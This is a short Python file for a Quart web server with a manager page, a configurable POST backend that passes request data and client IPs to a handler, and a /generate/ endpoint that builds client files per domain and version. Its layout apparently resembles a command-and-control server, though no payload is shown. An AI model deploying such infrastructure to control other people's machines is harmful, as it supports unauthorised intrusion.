from .backend import *
from ..utils import generate_client
from quart import *
from ..config import CONFIG

# import logging
app = Quart(__name__, static_folder="static")


# handler = logging.FileHandler()
# app.logger.addHandler(handler)


@app.route(CONFIG["web"]["control"])
async def web_control():
    return await render_template("manager.html")


@app.route(CONFIG["web"]["backend"], methods=['POST'])
async def backend():
    # todo:check UA and other
    data = await request.get_data()
    if CONFIG["base"]["cdn"] is False:
        return handle(data, request.remote_addr)
    else:
        return handle(data, request.headers[CONFIG["base"]["source_ip_tag"]])


@app.route('/generate/', methods=['GET'])
async def generate():
    domain = request.args.get("domain")
    version = request.args.get("version")
    ok, result, filename = generate_client(domain, version)
    if not ok:
        return result
    else:
        return await send_from_directory(app.static_folder, result, as_attachment=True, attachment_filename="")
